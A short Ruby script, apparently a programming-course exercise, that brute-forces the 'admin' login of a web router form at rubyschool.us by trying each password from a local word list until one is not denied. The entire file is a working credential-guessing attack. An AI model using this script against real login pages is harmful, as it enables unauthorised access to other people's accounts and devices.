require "net/http"
require "uri"


def is_wrong_password? password
	uri = URI.parse 'http://rubyschool.us/router'  # Universal Resource Identificator
	response = Net::HTTP.post_form(uri, :login => "admin", :password => password).body
	return response.include? "denied" # return можно опустить
end


input = File.open "passwords.txt", "r"
	
while (line = input.gets)
	line.strip!
	print "Trying password #{line}..."

	if is_wrong_password? line
		puts "Error"
	else
		puts "Found!"
		input.close
		exit
	end
end